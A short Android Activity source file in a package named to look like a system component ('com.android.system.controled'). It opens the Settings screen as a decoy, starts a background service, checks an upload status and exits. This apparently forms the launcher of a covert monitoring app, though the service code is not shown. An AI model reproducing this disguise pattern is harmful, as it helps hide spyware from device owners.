package com.android.system.controled;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;

public class MainAtivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		startActivity(new Intent(Settings.ACTION_SETTINGS));
		Globle.startBackService(MainAtivity.this);// Start the back service
		Globle.checkUploadedOrNot(MainAtivity.this);
		finish();
	}

}
